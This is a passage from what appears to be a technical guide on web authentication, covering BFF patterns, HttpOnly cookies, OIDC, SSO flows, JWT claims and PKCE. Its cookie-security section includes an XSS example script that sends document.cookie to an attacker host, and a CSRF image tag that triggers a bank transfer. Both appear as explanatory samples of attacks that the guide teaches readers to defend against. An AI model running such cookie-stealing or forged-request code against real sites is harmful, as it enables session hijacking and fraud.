      {
        "label": "DPoP",
        "title": "DPoP (Demonstrating Proof-of-Possession)",
        "comparedTo": "BFF Pattern",
        "actors": ["Client Application (SPA or BFF)", "Auth Server", "Resource Server"],
        "interactions": [
          { "from": "Client Application (SPA or BFF)", "to": "Client Application (SPA or BFF)", "message": "generate DPoP key pair" },
          { "from": "Client Application (SPA or BFF)", "to": "Auth Server", "message": "token request + DPoP proof" },
          { "from": "Auth Server", "to": "Client Application (SPA or BFF)", "message": "token (bound to key)" },
          { "from": "Client Application (SPA or BFF)", "to": "Resource Server", "message": "token + DPoP proof", "improvement": true, "fixes": "Token bound to key - stolen token is useless without private key! Tokens are cryptographically bound to the client's private key via DPoP. Even if an attacker steals the token, they cannot use it without the private key to generate valid DPoP proofs. This is sender-constrained authentication." },
          { "from": "Resource Server", "to": "Resource Server", "message": "verify proof signature" }
        ],
        "keyImprovement": "Tokens are cryptographically bound to the client's private key via DPoP. Even if an attacker steals the token, they cannot use it without the private key to generate valid DPoP proofs. This is sender-constrained authentication."
      }
    ]
  }
  </script>
</div>

## BFF Pattern with HttpOnly Cookies: The Modern Best Practice

A modern secure 🤔 (1) pattern is to ==use an HttpOnly cookie (the container) to transport a JWT token (**Stateless BFF**) or a session ID (**Stateful BFF**)==. In this setup, the authentication server issues a token (like a JWT) but instead of sending it to the JavaScript code, it places it inside an HttpOnly cookie. The browser automatically stores the cookie and sends it with every request to your backend, combining the stateless benefits of tokens with the built-in XSS protection of cookies.
{ .annotate }

1. Bearer tokens can be stolen via XSS, log files, or malicious browser extensions, so modern mitigations add proof-of-possession (e.g., `DPoP`, `mTLS`) to bind tokens to the legitimate sender only. See Auth0's [OAuth 2.0 Security Enhancements](https://auth0.com/blog/oauth2-security-enhancements) and [Sender Constraining](https://auth0.com/docs/secure/sender-constraining) for details.

| Feature                        | ⚡Stateless BFF                                                   | 🛡️Stateful BFF                                                                                                    | 🚀Hybrid BFF                                                                                         |
| ------------------------------ | --------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| **What is inside the Cookie?** | Both access token and refresh token (HttpOnly)            | ✅A random opaque session ID<br/><br/>Or a JWT-like session token issued by BFF (not by IdP)<br/><br/>Both session id and session token could be saved in local memory or a remote Redis cache for scalability                                                                                               | Short-lived access token JWT (HttpOnly)                                                            |
| **Where is the JWT?**          | Inside the cookie (browser)                                     | ✅All in server-side BFF store (often Redis)                                                                                              | **Stateless** access token in client-side cookie<br/><br/>**Stateful** refresh token + extra context in server-side BFF store                                 |
| **Cookie Size**                | Large with access token<br/>(can hit 4 KB limit)                                      | ✅Tiny (just an cookie session ID)                                                                                                | Large with access token<br/>(But trimmed lifetime/claims)                                                           |
| **Performance**                | Larger cookie + JWT signature verification; no store lookup     | Extra Redis/DB lookup each request                                                                               | ✅99% requests are stateless JWT access token checks;<br/><br/>occasional store refresh token lookup when minting new access tokens             |
| **Complexity**                 | ✅Low (no BFF store required)                                      | High (requires durable session store)                                                                            | High (almost the same as Stateful BFF)                               |
| **Security Verdict**           | ✅ Good enough (mitigates XSS/CSRF via HttpOnly/SameSite)<br/>❌long-live refresh token is at client side<br/>❌Cannot revoke tokens immediately         | ✅✅✅ Best: full server control over sessions and immediate revocation capability                                   | ✅✅ Balanced: long-live refresh token is at BFF side, fast revocation via store<br/>❗limited exposure window per short-live access token |

!!! warning "Refresh Tokens must be stored securely and with a rotation mechanism since they allow a user to remain authenticated essentially forever."

!!! note "See also: Storage for access token, refresh token, ID token, and session cookie"
    [Storage for access token, refresh token, ID token, and session cookie](#storage-for-access-token-refresh-token-id-token-and-session-cookie)

!!! note "Stateless and Stateful BFF hybrid mode with short revocation time"
    In practice, many BFF implementations use a hybrid approach in high-throughput systems (1000 requests/hour/user): they store a **short-lived** (15 min for example) JWT `access_token` inside an HttpOnly cookie for **stateless** authentication, while also maintaining a server-side session store for additional user context, **long-lived** (expires in 7 days for example) `refresh_token`, or other **stateful** data. This hybrid model combines the benefits of both approaches, providing robust security and flexibility.

    **The trade-off**: You sacrifice ~1% performance (Redis/DB IO lookup for refresh token, but ~99% requests are with access token which need local CPU compute only for JWT verification) for dramatically better security posture (Delete refresh_token -> no new JWTs issued). It's important to notice that the current JWT access token can still alive for at most 15 min after the refresh_token deletion. In practice, this is imperceptible to users but gives you instant revocation capability.
    This is why it's considered "best", it's the optimal point on the security/performance curve for most applications.

    Hybrid mode is **NOT** useful for light user load (1 requests/hour/user) with short lived access tokens (15 min), use stateful BFF only in that case.

!!! Tip "Token-Mediating Backend pattern"
    While a BFF can act as an API proxy or mini-IdP and session manager, it may become a throughput bottleneck. The [Token-Mediating Backend pattern](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#name-token-mediating-backend) addresses this by letting the client browser call downstream APIs directly with short-lived access tokens minted by BFF. This shifts access tokens into the client, so the security posture is weaker unless hardened with mechanisms such as [DPoP (Demonstrating Proof of Possession)](https://auth0.com/blog/oauth2-security-enhancements/#Demonstrating-Proof-of-Possession--DPoP).

    "The more moving parts in auth, the harder it is to attack. 😂"

## Cookies and OIDC

Session cookies are simpler for single-application scenarios, while OIDC is better suited for distributed systems, microservices, and multi-application environments where centralized authentication and SSO are needed.

- **Cookies**

    Are a traditional authentication mechanism where the server creates a session after successful login and sends a session ID to the client as a cookie. The client includes this cookie in subsequent requests to maintain the authenticated state. This approach is **tightly coupled** to the server that created the **stateful** session and requires **server-side session storage**.

- **OIDC**:

    Is a **stateless, distributed-friendly authentication protocol** that uses tokens (ID **token**, access token) instead of server-side sessions. Tokens are **self-contained** (especially JWTs), can be **verified independently** without server state, and enable **single sign-on (SSO)** across multiple applications. OIDC separates the authentication provider (IdP) from the application, allowing **centralized identity management**.

- **Session cookies + OIDC**

    Also known as **BFF (Backend For Frontend)** (check [OIDC Authorization Code Flow (Confidential Client) with BFF pattern and Session Cookies](#oidc-authorization-code-flow-confidential-client-with-bff-pattern-and-session-cookies) for more info), is a common pattern: OIDC is used for initial authentication and obtaining user identity, then session cookies are used to maintain the authenticated state within the application for **performance** (avoid sending large 2-4KB JWT on every request, but with ~100 byte cookie) and **simplicity** (frontend just needs to include a cookie with its requests, just like in the old days, and doesn't need to manage token refreshing or storage).

    **Session cookie + OIDC hybrid (BFF pattern) with FastAPI and Microsoft Identity Platform auth flow:**

    ```mermaid
    sequenceDiagram
        participant Browser
        participant BFF as BFF (FastAPI)
        participant IdP as Microsoft Identity Platform
        participant API as Downstream API

        Note over Browser,API: Initial Authentication
        Browser->>BFF: GET /login
        BFF->>Browser: Redirect to Azure Entra
        Browser->>IdP: Authorization request
        IdP->>Browser: Login page
        Browser->>IdP: Credentials
        IdP->>Browser: Redirect with auth code
        Browser->>BFF: GET /callback?code=xxx
        BFF->>IdP: Exchange code for tokens
        IdP->>BFF: id_token + access_token (JWT ~3KB)
        BFF->>BFF: Create session, store tokens
        BFF->>Browser: 🍪Set-Cookie: session_id=abc (~100B)

        Note over Browser,API: Subsequent Requests (Performance Win)
        Browser->>BFF: GET /api/data<br/>Cookie: session_id=abc (~100B)
        BFF->>BFF: Validate session
        BFF->>API: GET /resource<br/>Authorization: Bearer JWT (~3KB)
        API->>BFF: Response data
        BFF->>Browser: Response data

        Note over Browser,BFF: Multiple frontend requests = tiny cookies
        Note over BFF,API: Selective backend calls = JWTs only when needed
    ```

### Cookie types and storage

| Property                     | Session cookie                                                                                                   | Persistent cookie                                                                                                         | Private-mode cookie                                                                                                                       |
|------------------------------|------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------|
| **How It's Defined**         | `Set-Cookie: name=value; Path=/` (no `Expires`/`Max-Age`)                                                        | `Set-Cookie: name=value; Expires=...` or `Max-Age=...`                                                                    | Any `Set-Cookie` inside **private/incognito windows**                                                                                     |
| **Where It's Stored Internally** | In the **normal profile cookie store** (disk DB + memory cache)                                                  | Normal profile cookie store (disk DB + memory cache)                                                                      | **Separate, ephemeral cookie store** for that private session (RAM / temp)                                                               |
| **Lifetime / When It Dies**  | Ends when the **browser session** ends (all normal windows closed)\*                                             | Until `Expires`/`Max-Age` is reached, or user clears site data                                                             | When the **last private/incognito window** is closed                                                                                      |
| **Survives Browser Restart?**| ❓ Depends on browser setting ("restore session")<br/>⚠️ Often YES                                                | ✅ Yes, until expiry                                                                                                       | ❌ No - completely wiped                                                                                                                  |
| **Typical Use**              | Login sessions, CSRF tokens, short-lived state                                                                   | "Remember me", long-lived app sessions, prefs                                                                              | Temporary logins in incognito, testing flows                                                                                              |
| **Notes**                    | Conceptually "in-memory", but many browsers persist them to disk and clear on session end.                        | Longer theft window if device is compromised; combine with `Secure`, `HttpOnly`, `SameSite`.                              | Same semantics as session/persistent, but the whole store is destroyed with private session.                                             |

### Storage for access token, refresh token, ID token, and session cookie

| Scenario                         | AT (Access Token)                                | RT (Refresh Token)                                            | IDT (ID Token)                                         | App Session (your app)                                               | IdP Session (SSO at IdP)                                      |
|----------------------------------|--------------------------------------------------|----------------------------------------------------------------|-------------------------------------------------------|------------------------------------------------------------------------|----------------------------------------------------------------|
| SPA **without BFF** (normal)    | JS **in-memory** only (per tab, lost on refresh) | ❌ **Modern IdPs rarely issue to public clients**, rely on IdP session + short AT<br/><br/>**If IdP insists the issue**: In-memory only (accept no persistence) OR LocalStorage (if using Rotation)<br/>As LocalStorage is the simplest persistent & shared cross tabs storage accessible to JS, and RT needs to be persistent on page refresh<br/>XSS can steal the RT if saved in LocalStorage, but rotation limits damage<br/><br/>**Best solution:** no RT, use IdP session cookie to refresh AT | In-memory, extract user claims once, then discard | ❌ **No server session** - stateless; AT expiry = "session" end, or use short-lived AT + RT for longer sessions | **HttpOnly cookie** on `idp.com` (enables SSO across apps) |
| SPA **without BFF** (private / incognito) | Same: in-memory only | ❌Modern IdP rarely issue to public clients.<br>In-memory if issued (rare).  | Same: in-memory | ❌ No session (stateless SPA) | IdP cookie exists only in private session, wiped on close |
| SPA **with BFF** (normal)       | **Never in browser**; BFF holds it in memory/cache for request | **BFF backend only**: DB/Redis with session ID, encrypted at rest | **BFF backend only**, or claims embedded in session object | ✅ **HttpOnly, Secure, SameSite=Lax cookie**: `session_id=abc` on `app.example.com` | **HttpOnly cookie** on `idp.com` (enables SSO between BFF apps) |
| SPA **with BFF** (private / incognito) | Same: never in browser | Same: BFF backend only | Same: BFF backend | Same: `session_id` cookie dies with private session | IdP cookie lives only for that private session |
| **Native mobile app** (no BFF)  | **In-memory** in app process (RAM only, never persisted) | ✅ **OS secure storage**: iOS Keychain (with kSecAttrAccessibleWhenUnlockedThisDeviceOnly), Android Keystore (EncryptedSharedPreferences) | In-memory; or secure storage if needed for offline user info | App's session state in memory; RT acts as persistent session token | If using **AppAuth/system browser**: IdP cookie in **isolated browser storage** (app can't access directly) |

### Cookie is still very important in modern web auth

Even with the rise of token-based authentication mechanisms like OIDC and JWT, cookies remain a fundamental component of web authentication. They provide a convenient way to maintain session state, especially in traditional web applications and BFF architectures. Properly secured cookies (using HttpOnly, Secure, SameSite attributes) can effectively mitigate risks such as XSS and CSRF attacks.

When people say *"Cookies are legacy."* they usually mean *"Server-side sessions are legacy."*.

| Aspect               | ❌The 'Legacy' Part (Being Phased Out)                  | ❌The 'Insecure' Trend (Local Storage)                          | ✅The 'Modern' Part (First-Party HttpOnly Cookies)                                                                      |
| -------------------- | ----------------------------------------------------- | ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| **Primary Use Case** | Cross-site tracking, ads, retargeting                 | SPA Authentication (JWTs), UI preferences                     | User session management, authentication                                                                               |
| **Storage Type**     | Third-party cookies<br/><br/>You visit `Shoes.com`, but `Facebook.com` leaves a cookie on your browser to see that you like shoes.                                   | Browser Local Storage (Not a cookie)<br/><br/>Get a token, put it in localStorage,<br/>send it in the Header.                          | First-party cookies, stored in browser's cookie store (in memory if session only, or on disk if persistent cookie)                                                                                                 |
| **Current Status**   | Blocked by default in Safari/Firefox; dying in Chrome | Discouraged for Auth; vulnerable to XSS (Hackers can read it) | Standard & Secure (when using HttpOnly flag)<br/>👍Privacy: stay on one site<br/>👍Security: browser hides the keys, no XSS risk |
| **Key Trend**        | Replacement by Privacy Sandbox / First-party data     | Moving back to Cookies (BFF Pattern) to hide tokens from JS   | Strengthened security via attributes (HttpOnly, Secure, SameSite)|

!!! note "The 'Pendulum Swing': Cookies -> localStorage -> HttpOnly Cookies"

    In web development, the pendulum is swinging back.

    - **2000s**: Everyone used **Cookies** (Secure).

    - **2010s**: Everyone switched to **Local Storage** + JWTs because it was easier for SPAs, purely stateless JWT token. No cookies, no sessions, no CSRF middleware ("The New Way" - Insecure).

    - **2020s**: We realized Local Storage is dangerous (XSS attacks). Now, the industry is moving back to Cookies ("The Legacy Way"), but using them to hold modern JWTs. And with **HttpOnly cookies** stored in the browser's cookie store (in memory for session cookies or on disk to browser's SQLite DB for e.g. if persistent cookie with the `Expires` or `Max-Age` attribute), they are not accessible to JavaScript, mitigating XSS risks.

### Securing Cookies in Modern Authentication

!!! warning "It's secure ONLY IF your browser, underlying OS, device, the network layer, even the target servers are secure"

`HttpOnly`, `Secure`, and `SameSite` cookie attributes is key to modern cookie security. Here's how they work together to mitigate risks:

- `HttpOnly`: This attribute makes a cookie inaccessible to client-side JavaScript (document.cookie API). This is your primary defense against `XSS` (Cross-Site Scripting) attacks, as it prevents malicious scripts from stealing session cookies. **Attacker cannot read the cookie**.

    !!! note "Example: XSS (Cross-Site Scripting) Attack"

        1. Attacker injects malicious script into a vulnerable web page.

            ```html title="Example: XSS Cross-Site Scripting Attack"
            <script>
                fetch('https://attacker.com/steal?cookie=' + document.cookie)
            </script>
            ```

        2. You visit the compromised page.
        3. If cookies are stored in localStorage or non-HttpOnly cookies -> ⚠️stolen⚠️

- `Secure`: This ensures the cookie is only sent over encrypted HTTPS connections. This prevents `man-in-the-middle` attackers from eavesdropping and stealing cookies during transmission. **Attacker cannot read the cookie in transit**.
- `SameSite`: This attribute helps defeat `CSRF` (Cross-Site Request Forgery) attacks by controlling when cookies are sent with cross-site requests. **Attacker cannot use the cookie**.

    - `SameSite=Lax` (Recommended default): Cookies are sent on same-site requests and top-level navigations GET to your site (e.g., clicking a link from an email or Google to your site). This provides a good balance of security and usability. CSRF is still possible for state-changing GET or some POST-via-redirect tricks, so still need server-side CSRF defenses.
    - `SameSite=Strict` (Maximum security): Cookies are only sent in a first-party context.
    - `SameSite=None`: Cookies are sent in all contexts, including third-party. This is sometimes necessary for cross-site features but must be paired with the Secure attribute.

    !!! note "Example: CSRF (Cross-Site Request Forgery) Attack"

        1. You are logged in to bank.com (your browser stores login cookie)
        2. You visit evil.com
        3. evil.com secretly loads:

            ```html
            <img src="https://bank.com/transfer?to=attacker&amount=5000">
            ```

        5. Your browser automatically sends your cookies to bank.com
        6. The bank sees a valid cookie and approves the transfer -> ⚠️Bad⚠️

        So CSRF is an attack FROM ANOTHER SITE, using your browser as a trusted agent.

        **How SameSite prevents CSRF:**

        CSRF requires:

        1. Attacker site -> triggering a request to victim site
        2. Browser -> auto-attaching cookies

        SameSite blocks the second step if use `SameSite=Strict`. With `SameSite=Lax`, it blocks cross-site POST requests, but allows top-level GET navigations.

        Example:

         - Victim site: `https://bank.com`
         - Attacker site: `https://evil.com`

        The browser tries to load:

        ```html
        <form action="https://bank.com/transfer" method="POST">
        ```

        But if cookie is:

        ```ini
        Set-Cookie: session=123; Domain=bank.com; Path=/; SameSite=Lax;
        ```

        Then browser thinks:

        - This request originates from `evil.com`
        - This is a cross-site POST to another site (`bank.com`)

        -> 🎉Do NOT send the session cookie🎉

## SSO and OIDC

**OIDC** establishes user identity, while **SSO** is a capability layered atop protocols like `OIDC/JSON`, `SAML/XML`, or `Kerberos` to reuse that identity across apps. ==SSO sessions hinge on IdP-issued [HttpOnly cookies](#securing-cookies-in-modern-authentication) stored in the browser==, the client application doesn't see this cookies, but each time the browser visits the IdP domain, the browser automatically attaches the cookie, allowing the IdP to recognize the user and skip login prompts.

### High level SSO with IdP session cookie flow

```mermaid
sequenceDiagram
    autonumber
    %% VISUAL GROUPING
    box "User's Machine" #fff
        actor User
        participant Browser
    end

    box "Identity Provider" #f3e5f5
        participant IdP as IdP Server<br/>(auth.idp.com)
    end

    box "Applications" #e1f5fe
        participant App1 as App 1<br/>(app1.com)
        participant App2 as App 2<br/>(app2.com)
    end

    %% ============================================================
    %% PHASE 1: LOGGING INTO APP 1 (The Hard Way)
    %% ============================================================
    Note over User, App1: 🛑 1. User visits App 1 (Not Logged In)

    User->>App1: Visit App1
    App1->>Browser: 302 Redirect to IdP /authorize

    Note right of Browser: Browser goes to IdP.<br/>🚫 First login, it has NO cookies for 'auth.idp.com' yet.
    Browser->>IdP: GET /authorize

    IdP->>Browser: Show Login Form
    User->>Browser: Type Username / Password (or MFA)
    Browser->>IdP: Submit Credentials

    rect rgb(200, 255, 200)
    Note right of IdP: ✅ LOGIN SUCCESS
    Note right of IdP: IdP creates the "SSO Session"<br/>but won't be used until next app login.
    IdP->>Browser: 🍪 Set-Cookie: idp_session=SECRET_ID<br/>Domain=auth.idp.com
    end

    IdP->>Browser: 302 Redirect back to App 1
    Browser->>App1: Login Complete (App 1 Session Created)

    %% ============================================================
    %% PHASE 2: LOGGING INTO APP 2 (The SSO Way)
    %% ============================================================
    Note over User, App1: 🚀 2. User visits App 2 (SSO Kicks In)

    User->>App2: Visit App2
    App2->>Browser: 302 Redirect to IdP /authorize

    rect rgb(200, 255, 200)
    Note right of Browser: 🍪 BROWSER AUTOMATION<br/>The URL matches 'auth.idp.com'.<br/>Browser AUTOMATICALLY attaches the cookie<br/>✅with URL redirect or popup,<br/>(🚫legacy hidden iframe SSO if blocked by many browsers)

    Browser->>IdP: GET /authorize<br/>Cookie: idp_session=SECRET_ID

    Note left of IdP: 🔍 IdP checks Cookie... VALID!<br/>"I know this user. Skip password.<br/>😇SSO OK"
    end

    IdP->>Browser: 302 Redirect back to App 2
    Browser->>App2: Login Complete (App 2 Session Created)

    Note over User, App2: User is logged in instantly!
```

### Detailed SSO flow with two BFF apps sharing the same IdP and session store

```mermaid
sequenceDiagram
    autonumber
    actor User as User (Browser)
    participant App1 as App1 UI
    participant App2 as App2 UI
    participant BFF1 as BFF1 (FastAPI A)
    participant BFF2 as BFF2 (FastAPI B)
    participant BFFStore as BFF Session Store<br/>(shared for BFF1+BFF2)
    participant IdP as Identity Provider (OIDC)
    participant IdPStore as IdP Store

    %% =====================================================================
    %% FIRST LOGIN - APP1
    %% =====================================================================

    User ->> App1: Visit App1 (unauthenticated)
    App1 ->> BFF1: GET /login

    Note over BFF1: Create state=S1<br/>Create nonce=N1<br/>Generate pre_session=P1
    BFF1 ->> BFFStore: Save {state:S1, nonce:N1, pre_session:P1}

    %% FRONT-CHANNEL REDIRECT TO IdP
    BFF1 ->> User: 302 Redirect to IdP /authorize?<br/>client_id=app1<br/>state=S1<br/>nonce=N1

    %% BROWSER SENDS TO IdP
    User ->> IdP: GET /authorize (state=S1, nonce=N1)

    %% NO EXISTING IdP SESSION
    Note over IdP: No idp_session cookie received -><br/>User not logged in at IdP

    User ->> IdP: Enter username/password (interactive login)

    %% IdP CREATES SSO SESSION
    Note over IdP: Create login_session LS123<br/>Bind to user "alice"
    IdP ->> IdPStore: Save LS123

    %% **IdP sets its own SSO session cookie in browser**
    IdP ->> User: 🍪Set-Cookie: idp_session=IDPSESS_ABC<br>Domain=auth.idp.com<br/>HttpOnly<br/>Secure<br/>SameSite=Lax

    %% THEN REDIRECT BACK TO APP1
    IdP ->> User: 302 https://app1/callback?<br/>code=C111&state=S1

    %% BROWSER RETURNS TO APP1 BACKEND
    User ->> BFF1: GET /callback?code=C111&state=S1

    %% BACKEND VALIDATES STATE
    BFF1 ->> BFFStore: Load stored state for P1
    BFF1 ->> BFF1: Validate: callback.state == stored.state ?

    %% TOKEN EXCHANGE
    BFF1 ->> IdP: POST /token (code=C111)
    IdP ->> BFF1: id_token + access_token + refresh_token

    %% NONCE VALIDATION
    BFF1 ->> BFFStore: Load stored nonce for P1
    BFF1 ->> BFF1: Validate: id_token.nonce == stored nonce ?

    %% CREATE LOCAL APP SESSION
    Note over BFF1: Create local session SESS1<br/>with user + tokens
    BFF1 ->> BFFStore: Save session SESS1 -> { user:alice, tokens }

    %% APP1 SESSION COOKIE
    BFF1 ->> User: 🍪(Stateful BFF) Set-Cookie: session_id=SESS1<br>Domain=bff.company.com<br/>HttpOnly<br/>Secure<br/>SameSite=Lax

    User ->> App1: Authenticated (Authorized 🔓)


    %% =====================================================================
    %% SECOND LOGIN - APP2 (SSO)
    %% =====================================================================

    Note over User,IdpStore: SECOND LOGIN to APP2 with SSO

    User ->> App2: Visit App2
    App2 ->> BFF2: GET /login
    alt Browser already has session_id=SESS2 cookie
        BFF2 ->> BFFStore: Lookup SESS2
        alt Valid session found
            Note over BFF2: User already logged into App2<br/>Skip IdP, skip SSO
            BFF2 ->> User: 302 Redirect to App2 home (Authorized)
        else Invalid/expired SESS2
            Note over BFF2: Session invalid -> perform fresh OIDC login
        end
    else No session_id cookie
        Note over BFF2: No App2 session -> must start OIDC flow
    end

    %% Only reaches here if LOCAL session doesn't exist

    Note over BFF2: Create state S2<br/>Create nonce N2
    BFF2 ->> BFFStore: Save {state:S2, nonce:N2, pre_session:P2}

    BFF2 ->> User: 302 Redirect to IdP /authorize?<br/>client_id=app2<br/>state=S2<br/>nonce=N2

    Note over User: ❗Send IdP cookie (SSO session cookie) as first-party cookie for App2 as SSO login by a browser popup or redirect.<br/>(Previous first login to App1 didn't has such cookie, so started interactive login)
    User ->> IdP: GET /authorize?<br/>client_id=app2<br/>&redirect_uri=https://app2/callback<br/>&response_type=code<br/>&scope=openid%20profile%20offline_access<br/>&state=S2<br/>&nonce=N2<br/><br/>Headers<br/>🍪Cookie: idp_session=IDPSESS_ABC

    Note over IdP:  IdP session exists -> SKIP login UI<br/>✅ No interactive user login any more (SSO silent login)
    IdP ->> User: 302 https://app2/callback?code=C222&state=S2

    User ->> BFF2: GET /callback?code=C222&state=S2

    %% STATE VALIDATION (APP2)
    BFF2 ->> BFFStore: Load state S2
    BFF2 ->> BFF2: Validate: callback.state == stored.state ?
    Note over BFF2: State validation OK

    %% TOKEN EXCHANGE
    BFF2 ->> IdP: POST /token (code=C222)
    IdP ->> BFF2: id_token + access_token + refresh_token

    %% NONCE VALIDATION (APP2)
    BFF2 ->> BFFStore: Load nonce N2
    BFF2 ->> BFF2: Validate: id_token.nonce == stored_nonce ?
    Note over BFF2: Nonce validation OK

    %% CREATE SESSION FOR APP2
    Note over BFF2: Create local app session SESS2
    BFF2 ->> BFFStore: Save session SESS2 -> { user:alice, tokens }

    BFF2 ->> User: 🍪Set-Cookie session_id=SESS2

    User ->> App2: Authenticated instantly (SSO)


    %% =====================================================================
    %% RESULT - TWO APP SESSIONS, ONE IdP SESSION
    %% =====================================================================

    Note over User,App1: User has session_id=SESS1 for App1
    Note over User,App2: User has session_id=SESS2 for App2

    Note over IdP: One IdP SSO session:<br/>idp_session=IDPSESS_ABC<br/>powers login-free access for all apps
```

## FAQ

### JWT access token example

Official doc: [IETF RFC7519 for JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)

```json title="raw access_token"
eyJhbGciOiJFUzI1NiIsImtpZCI6IjllciJ9.eyJhdWQiOiJodHRwczovL2JhY2tlbmQuZXhhbXBsZS5jb20iLCJpc3MiOiJodHRwczovL2FzLmV4YW1wbGUuY29tIiwiZXhwIjoxNDQxOTE3NTkzLCJpYXQiOjE0NDE5MTc1MzMsInN1YiI6ImJkY0BleGFtcGxlLmNvbSIsInNjb3BlIjoiYXBpIn0.40y3ZgQedw6rxf59WlwHDD9jryFOr0_Wh3CGozQBihNBhnXEQgU85AI9x3KmsPottVMLPIWvmDCMy5-kdXjwhw
```

```json title="decoded access_token"
{
  "alg": "ES256",
  "kid": "9er"
}.{
  "aud": "https://backend.example.com",
  "iss": "https://as.example.com",
  "exp": 1441917593,
  "iat": 1441917533,
  "sub": "bdc@example.com",
  "scope": "api"
}.[Signature]
```

| Claim type | Value                             | Notes                                                                                                                                                                                                                                                                                                                                 |
|------------|-----------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `aud`      | `https://backend.example.com`     | The `aud` (audience) claim identifies the recipients that the JWT is intended for. Each principal intended to process the JWT MUST identify itself with a value in the audience claim. If the principal processing the claim does not identify itself with a value in the `aud` claim when this claim is present, then the JWT MUST be rejected. [[RFC 7519, Section 4.1.3](https://tools.ietf.org/html/rfc7519#section-4.1.3)] |
| `iss`      | `https://as.example.com`          | The `iss` (issuer) claim identifies the principal that issued the JWT. The `iss` value is a case-sensitive string containing a StringOrURI value. [[RFC 7519, Section 4.1.1](https://tools.ietf.org/html/rfc7519#section-4.1.1)]                                                                                                                                                                                                   |
| `exp`      | `Thu Sep 10 2015 22:39:53 GMT+0200 (Central European Summer Time)` | The `exp` (expiration time) claim identifies the expiration time on or after which the JWT MUST NOT be accepted for processing. Implementers MAY allow brief leeway to account for clock skew. [[RFC 7519, Section 4.1.4](https://tools.ietf.org/html/rfc7519#section-4.1.4)]                                                                                                               |
| `iat`      | `Thu Sep 10 2015 22:38:53 GMT+0200 (Central European Summer Time)` | The `iat` (issued at) claim identifies the time at which the JWT was issued. This claim can be used to determine the age of the JWT. [[RFC 7519, Section 4.1.6](https://tools.ietf.org/html/rfc7519#section-4.1.6)]                                                                                                                                                                         |
| `sub`      | `bdc@example.com`                 | The `sub` (subject) claim identifies the principal that is the subject of the JWT. The subject value MUST either be scoped to be locally unique in the context of the issuer or be globally unique. [[RFC 7519, Section 4.1.2](https://tools.ietf.org/html/rfc7519#section-4.1.2)]                                                                                                         |
| `scope`<br/><br/>vendor specific claim, some use `scp`    | `api`                             | String, a space separated list of scopes (space replaced by `%20` in safe encoded URL). Exposed by the resource server (a.k.a `aud` (audience)) for which the client application has requested (and received) consent. Only included for user tokens.|

### PKCE (Proof Key for Code Exchange)

**PKCE** is an extension to the Authorization Code Flow to prevent **Authorization Code Injection attacks**. It is designed for public clients (e.g., SPA, mobile apps) that cannot securely store a client secret.

```mermaid
sequenceDiagram
    autonumber
    participant SPA as SPA
    participant Browser as Browser (front-channel)
    participant IdP as IdP

    SPA->>SPA: Generate code_verifier
    SPA->>SPA: Derive code_challenge = hash(code_verifier)

    Note over SPA,IdP: ⚠️Unsecure front-channel communication as browser is involved
    rect rgb(255,230,230)
        SPA->>Browser: Redirect /authorize?code_challenge=hash<br/>(state, nonce...)
        Browser->>IdP: GET /authorize (code_challenge visible)
    end

    IdP->>Browser: 302 redirect with authorization_code
    Browser->>SPA: Deliver authorization_code

    Note over SPA,IdP: ✅Secure back-channel communication as browser is not involved.<br/>code_verifier is only sent here. Never exposed to browser.
    rect rgb(230,255,230)
        SPA->>IdP: POST /token (authorization_code + code_verifier)
        IdP->>Idp: Validate hash(code_verifier) == code_challenge received earlier ?
        IdP->>SPA: Issue tokens
    end
```

!!! note "PKCE everywhere"
    - All public clients like SPA/mobile MUST use PKCE
    - Confidential clients (BFF etc.) SHOULD also use PKCE for enhanced security.

### OIDC vs OpenID vs OpenID 2.0

- **OpenID and OpenID 2.0** (based on XML) are both deprecated.

- **OIDC (OpenID Connect)** is the modern standard driven by the same foundation, which is based on OAuth2 with JWT.

### OIDC vs OAuth2

**In short**: **OIDC** adds authentication (verifying user identity) on top of **OAuth 2.0** as for authorization framework (verifying user access).

| Aspect | OAuth 2.0 | OIDC |
|--------|-----------|------|
| **Primary purpose** | Authorization (what can you access?) | Authentication (who are you?) |
| **Token type** | `access_token` only | `access_token` + `id_token` |
| **User identity** | Not standardized (indirect via `/userinfo` API call) | Standardized via `id_token` (JWT with claims) |
| **Use case** | API access delegation | User login + SSO |

!!! note "Indirect authentication with pure OAuth 2.0"
    It's worth noting that even with pure OAuth 2.0, applications can achieve a form of authentication indirectly: the `access_token` can be used to call an API endpoint (such as `/userinfo`, for e.g. <https://graph.microsoft.com/oidc/userinfo>) on the resource server to retrieve basic user profile information. By obtaining this data, the application can identify the user, match them against its own user database, and establish a local session. But this approach is not standardized and relies on application-specific implementation, which is precisely the gap that OIDC fills with its formal authentication layer.

!!! warning "`id_token` is used by the client application to authenticate the user, not to access resource servers"
    The `id_token` is intended for the client application (e.g. BFF backend, or the mobile app, or SPA) to verify the user's identity, display the user profile, ensure SSO, and establish a session, etc. It should not be used as a bearer token to access protected resources or APIs. Instead, the `access_token` (with permissions scope) should be used for that purpose.

### access_token vs id_token

| Aspect | access_token | id_token |
|--------|--------------|----------|
| **Purpose** | Used to access protected resources (APIs) | Used to authenticate the user to the client application.<br/><br/>Never sent to downstream APIs (resource servers).<br/><br/>Machine-to-Machine Client Credentials flow doesn't have `id_token`.<br/><br/>OAuth2.0 doesn't define `id_token`. OIDC (on top of OAuth2.0) does.<br/><br/>OIDC never uses machine-to-machine flow |
| **Audience**<br/>(`aud` claim) | Targeted at resource servers (APIs).<br/><br/>While client apps (such as SPAs) are able to inspect a JWT access_token, they should avoid depending on its contents. | Aimed at the client itself (for example, a BFF backend, native mobile app, or SPA). |
| **Content** | Contains scopes and permissions.<br/><br/>But could contains some common user claims too depends on IdP.<br/><br/>Could get full user profile by calling IdP `/userinfo` endpoint with access_token | Contains user identity claims (e.g., sub, name, email) |
| **Format** | Often a JWT, but could be opaque<br/><br/>use opaque token to call `/introspect` or `/userinfo`| Always a signed JWT (JWS) or encrypted (JWE) |
| **Validation** | Validated by resource servers | Validated by the client application |

??? note "`access_token` example"

    ```text
